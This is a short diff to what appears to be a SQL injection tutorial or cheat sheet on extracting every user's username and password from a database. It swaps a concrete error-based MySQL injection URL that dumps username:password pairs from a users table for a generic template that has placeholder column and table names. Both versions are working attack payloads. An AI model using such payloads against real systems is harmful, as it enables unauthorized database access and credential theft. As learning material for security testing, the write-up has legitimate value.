@@ -13,7 +13,7 @@ We wan't to extract the username and password of all the users in a database, bu
 
 **The query**
 
-    http://target/?id=1'+or+1+group+by+concat((select+concat(0x3c647164756d703e,concat_ws(0x3a,username,password),0x3c2f647164756d703e)+from+users+limit+0,1),0x00,ceil(rand(0)*2))+having+min(0)+--+-
+    http://target/?id=1'+or+1+group+by+concat((select+concat(0x3c647164756d703e,concat_ws(0x3a,column1,column2),0x3c2f647164756d703e)+from+table+limit+X,1),0x00,ceil(rand(0)*2))+having+min(0)+--+-
 
 **The output**
 
